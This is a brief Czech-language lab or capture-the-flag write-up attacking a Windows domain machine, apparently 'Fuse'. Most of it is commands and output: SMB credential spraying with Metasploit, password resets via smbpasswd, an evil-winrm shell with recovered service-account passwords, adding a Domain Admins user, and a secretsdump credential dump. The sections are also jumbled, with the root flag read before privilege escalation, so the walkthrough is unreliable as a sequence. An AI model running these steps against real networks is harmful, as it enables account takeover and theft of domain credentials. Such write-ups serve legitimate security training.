### Enumerace SMB
Kontroluji SMB sdílení a hledám data, která mohou obsahovat citlivé informace.
`msfconsole > use auxiliary/scanner/smb/smb_login`
```
=> tlavel:Fabricorp01
=> bhult:Fabricorp01

./impacket/examples/smbclient.py fabricorp.local/tlavel:Fabricorp01@$IP
smbpasswd -r fuse.fabricorp.local -U fabricorp.local/tlavel
./impacket/examples/smbclient.py fabricorp.local/tlavel:Pejsek03@$IP
```

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`msfconsole > use auxiliary/scanner/smb/smb_login`
```
=> [+] 10.10.10.193:445      - 10.10.10.193:445 - Success: '.\svc-print:$fab@s3Rv1ce$1'
=> [+] 10.10.10.193:445      - 10.10.10.193:445 - Success: '.\svc-scan:$fab@s3Rv1ce$1'
```

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`./evil-winrm/evil-winrm.rb -i fuse.fabricorp.local -u svc-print -p '$fab@s3Rv1ce$1'`

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`cat user.txt`
```
__CENSORED__
```

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`type root.txt`
```
__CENSORED__
```

### Eskalace oprávnění
Tento krok převádí nalezenou slabinu do privilegovaného přístupu.
`net user /add tomas Pejsek123 /domain`
```
net group "Domain Admins" tomas /ADD /DOMAIN
./impacket/examples/secretsdump.py fabricorp.local/tomas:Pejsek123@fuse.fabricorp.local
```
